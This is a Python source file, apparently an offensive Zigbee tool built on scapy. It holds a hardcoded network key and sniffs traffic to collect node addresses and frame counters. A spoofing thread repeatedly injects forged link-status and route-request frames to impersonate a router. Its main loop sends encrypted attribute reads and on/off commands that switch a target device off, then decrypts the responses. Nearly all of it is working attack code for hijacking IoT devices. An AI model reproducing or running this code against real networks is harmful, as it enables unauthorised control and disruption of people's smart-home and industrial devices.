from random import randint
from zigbee_frames.transceive import Transceiver
from util.wpan_interface import Phy
from scapy.all import conf, CacheInstance, Packet, sniff, sendp, srp1
from scapy.layers.dot15d4 import Dot15d4, Dot15d4Beacon, Dot15d4FCS, Dot15d4Data, Dot15d4Ack
from scapy.layers.zigbee import ZigBeeBeacon, ZigbeeNWK, ZigbeeSecurityHeader, ZigbeeAppDataPayload, ZigbeeClusterLibrary, ZCLGeneralReadAttributes, ZCLGeneralReadAttributesResponse, ZCLReadAttributeStatusRecord, ZigbeeNWKCommandPayload
from util.crypto import CryptoUtils
from zigbee_frames.frameprovider import FrameProvider
from threading import Thread
import time

database = {
    "network_key" : bytes.fromhex("31701f12dd93150ec4efce97e381ef06"),
    "nodes" : {},
    "frame_counter" : randint(0, 255) 
    }

class ZigbeeSpoofer:
    def __init__(self, frame_provider: FrameProvider):
        self.frame_provider = frame_provider
        Thread(target=self.spoofing_loop).start()
        
    def spoofing_loop(self):
        while True:
            sendp(self.frame_provider.link_status(0x1a62), iface="wpan0")
            #send a many to one route request to the
            sendp(self.frame_provider.many_to_one_route_request(0xfffd, 0x1a62), iface="wpan0")
            time.sleep(5)


def gather_nodes_and_extended_source(iface: str) -> dict:
    #sniff some traffic to build up a list of nodes:
    dict_of_nodes = {}
    def add_node(node: Dot15d4FCS):
        #node.show()
        if node.src_addr not in dict_of_nodes:
            dict_of_nodes[node.src_addr] = 0
            print(f"new node found: {node.src_addr:04x}")
        if dict_of_nodes[node.src_addr] == 0 and node.haslayer(ZigbeeSecurityHeader) and node.flags == 'security+extended_src':
            dict_of_nodes[node.src_addr] = node.ext_src.to_bytes(8, 'big')
            print(f"extended source found: {node.ext_src:016x}")
    global database
    database["nodes"] = dict_of_nodes
    
    sniff(iface=iface, prn=lambda x: add_node(Dot15d4FCS(x.do_build())), store=False, timeout=10)
    return dict_of_nodes

def find_counters(iface: str, nodes: dict):
    #sniff some traffic to find the frame counters of the nodes:
    def find_counter(node: Dot15d4FCS):
        if node.src_addr in nodes and node.haslayer(ZigbeeSecurityHeader):
            print(f"node {node.src_addr:04x} has frame counter {node.fc}")
            node.show()
            if node.src_addr == 0x0:
                global frame_counter 
                frame_counter = node.fc

    sniff(iface=iface, prn=lambda x: find_counter(Dot15d4FCS(x.do_build())), store=False, timeout=10)

if __name__ == '__main__':
    #from util.wpan_interface import Phy
    
    source_addr = bytes.fromhex("00:12:4b:00:1c:dd:27:3d".replace(":", ""))
    phy=Phy(int.from_bytes(source_addr), initial_channel=11, initialize=True, debug_monitor=False)
    
    '''
    gather_nodes_and_extended_source("wpan0")
    
    print("List of nodes:")
    for node in dict_of_nodes.keys():
        print(f"node {node:04x}, extended source: {dict_of_nodes[node]:016x}")
        
    find_counters("wpan0", dict_of_nodes)
    '''
    fp = FrameProvider()
    fp.set_security_frame_counter(database["frame_counter"])
    fp.set_extended_source(source_addr)
    fp.set_nwk_key(database["network_key"])
    
    ZigbeeSpoofer(fp)
    
    #link status and route request looper on a 10 second interval:
    
    def response_proc(packet: Packet, transaction_sequence: int) -> bool:
        if packet is not None and packet.src_addr == 0x943f:
            print(f"Packet: {packet.summary()}")
            if packet.haslayer(ZigbeeNWK) and packet.flags & 16:   
                print(f"extended source found: {packet.ext_src:016x}")
                if packet.src_addr not in database["nodes"]:
                    database["nodes"][packet.src_addr] = packet.ext_src.to_bytes(8, 'big')
            if packet.haslayer(ZigbeeNWK) and packet.flags & 2 and database["nodes"][packet.src_addr] is not None:
                print(f"network key: {database['network_key'].hex()}")
                decrypted_payload, success = CryptoUtils.zigbee_packet_decrypt(database['network_key'], packet, database["nodes"][packet.src_addr])
                if success:
                    if decrypted_payload.haslayer(ZigbeeClusterLibrary) and decrypted_payload.transaction_sequence == transaction_sequence:
                        decrypted_payload.show()
                        return True
                    
    '''
        if packet.haslayer(ZCLGeneralReadAttributesResponse):
            print("Got a response")
            packet.show()
            return True
        return
    '''
    while True:
        read_attributes_frame, transaction_sequence = fp.zcl_read_attributes(0x0, 0x1a62, 0x943f)
        Transceiver.send_and_receive(read_attributes_frame, response_proc, sleep_time=2, transaction_sequence_number=transaction_sequence)
        write_attributes_frame, transaction_sequence = fp.zcl_on_off(0x0, 0x1a62, 0x943f, False)
        Transceiver.send_and_receive(write_attributes_frame, response_proc, sleep_time=2, transaction_sequence_number=transaction_sequence)